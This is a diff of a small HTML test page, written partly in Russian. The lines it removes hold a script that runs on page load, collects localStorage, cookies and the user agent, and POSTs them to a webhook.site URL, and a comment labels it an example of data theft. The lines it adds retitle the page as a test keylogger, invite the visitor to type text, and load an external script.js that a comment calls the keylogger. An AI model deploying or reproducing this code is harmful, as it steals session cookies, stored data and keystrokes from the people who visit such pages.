@@ -1,28 +1,14 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Test Page</title>
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            // Запрашиваем содержимое localStorage (пример кражи данных)
-            let data = {
-                localStorage: JSON.stringify(localStorage),
-                cookies: document.cookie,
-                userAgent: navigator.userAgent
-            };
-
-            // Отправляем данные на Webhook.site
-            fetch("https://webhook.site/7fcc2c49-186f-4f3d-8f14-7a03443e2a5d", {  
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            });
-        });
-    </script>
+    <title>Тестовый кейлоггер</title>
 </head>
 <body>
-    <h1>Welcome to my site</h1>
+    <h1>Добро пожаловать</h1>
+    <p>Попробуйте ввести текст в любом месте...</p>
+
+    <script src="script.js"></script> <!-- Подключаем кейлоггер -->
 </body>
 </html>
